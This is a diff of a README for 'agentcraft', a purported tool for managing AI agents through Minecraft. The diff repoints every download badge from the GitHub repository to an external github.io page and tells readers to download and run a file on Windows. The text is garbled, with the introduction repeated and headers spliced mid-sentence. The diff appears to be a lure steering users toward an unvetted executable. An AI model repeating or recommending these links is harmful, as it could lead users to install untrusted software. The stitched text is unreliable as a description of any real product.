@@ -1,12 +1,12 @@
 # 🤖 agentcraft - Turn Minecraft Into Your AI Control Room
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://joaovictor11011.github.io)
 
 agentcraft is an end-user application for managing real AI agents with Minecraft as your interface. Instead of learning complicated developer tools, you use the familiar Minecraft world to see what your agents are doing, give them tasks, and keep everything organized in one place. It is built for people who want a clear, visual way to work with AI agents without needing to write code.
 
 The idea is simple: Minecraft becomes your control room. You can watch agent activity, assign jobs, check progress, and manage your setup from a blocky world that already feels easy to understand. agentcraft brings AI agent management into a space that feels practical, visual# 🤖 agentcraft - Control AI Agents Inside Minecraft
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://joaovictor11011.github.io)
 
 agentcraft is an end-user application that helps you manage real AI agents using Minecraft as your interface. In plain terms, it turns a familiar block-based world into a control room for AI helpers. You do not need to be a programmer to understand what your agents are doing or to give them new work. agentcraft is built around a simple idea: managing AI agents should feel visual, organized, and approachable.
 
@@ -53,7 +53,7 @@ agentcraft includes a set of practical features for managing real AI agents thro
 - **Visual agent dashboard:** See your agents in a Minecraft-based layout instead of a technical control panel.
 - **Task assignment:** Give each agent a clear job and keep track of what# 🤖 agentcraft - Control AI Agents Inside Minecraft
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://joaovictor11011.github.io)
 
 agentcraft is an end-user application for managing real AI agents with Minecraft as your interface. In simple terms, it gives you a visual place to organize AI helpers, see what they are doing, and give them work to do. You do not need to be a programmer to use it. agentcraft is designed for everyday computer users who want a clear, hands-on way to manage AI agents without learning complicated developer tools.
 
@@ -115,7 +115,7 @@ These features are built around one purpose: helping you manage real AI agents i
 
 Visit this link to download the application:
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-2E8B57?style=for-the-badge&labelColor=8A2BE2)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-2E8B57?style=for-the-badge&labelColor=8A2BE2)](https://joaovictor11011.github.io)
 
 Use the official link above as your download page. After the download finishes, open the downloaded item from the place where your browser saved it and start agentcraft on your Windows computer. When the application opens, use Minecraft as the interface to begin managing your AI agents.
 
@@ -136,7 +136,7 @@ A comfortable first run looks like this:
 
 Starting small is useful because it lets you learn the layout without feeling overwhelmed. Once you understand how one agent appears and how one# 🤖 agentcraft - Control AI Agents Inside Minecraft
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-FF5733?style=for-the-badge&labelColor=6A0DAD)](https://joaovictor11011.github.io)
 
 agentcraft is an end-user application for managing real AI agents with Minecraft as your interface. In plain terms, it gives you a visual place to organize AI helpers, see what they are working on, and hand them new tasks. You do not need to be a programmer to use it. agentcraft is designed for everyday computer users who want a clear, hands-on way to manage AI agents without learning technical developer tools first.
 
@@ -196,7 +196,7 @@ agentcraft is designed around visual management. You should be able to tell whet
 
 Visit this link to download the application:
 
-[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-2E8B57?style=for-the-badge&labelColor=8A2BE2)](https://github.com/Joaovictor11011/agentcraft)
+[![Download agentcraft](https://img.shields.io/badge/⬇️%20Download%20agentcraft-2E8B57?style=for-the-badge&labelColor=8A2BE2)](https://joaovictor11011.github.io)
 
 Open the official link above and use that page to get agentcraft. After the download finishes, open the file from the folder where your browser saved it and start the application on your Windows computer. When agentcraft is open, use Minecraft as the interface to begin managing your AI agents.
 
